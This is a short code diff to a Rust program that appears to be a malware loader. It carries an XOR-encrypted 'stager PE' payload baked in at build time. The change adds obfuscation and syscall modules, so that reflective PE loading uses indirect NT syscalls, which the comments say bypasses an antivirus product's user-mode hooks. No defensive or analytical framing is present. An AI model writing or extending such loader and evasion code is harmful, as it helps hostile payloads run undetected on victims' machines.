@@ -15,12 +15,18 @@
 #![allow(unused)]
 
 mod loader;
+mod obfs;
+mod syscall;
 
 // Encrypted payload: [key: 4 bytes] || [XOR-encrypted stager PE]
 // Written by build.rs from DM_STAGER_PATH; placeholder (4 zero bytes) when not set.
 static ENCRYPTED: &[u8] = include_bytes!(env!("DM_PACKED_PAYLOAD"));
 
 fn main() {
+    // Resolve NT syscall numbers so reflect_pe can use indirect syscalls
+    // (bypassing BD's user-mode hooks on NtAllocateVirtualMemory / NtProtectVirtualMemory).
+    let _ = unsafe { syscall::init() };
+
     // Placeholder guard: real payload is always >4 bytes
     if ENCRYPTED.len() <= 4 {
         return;
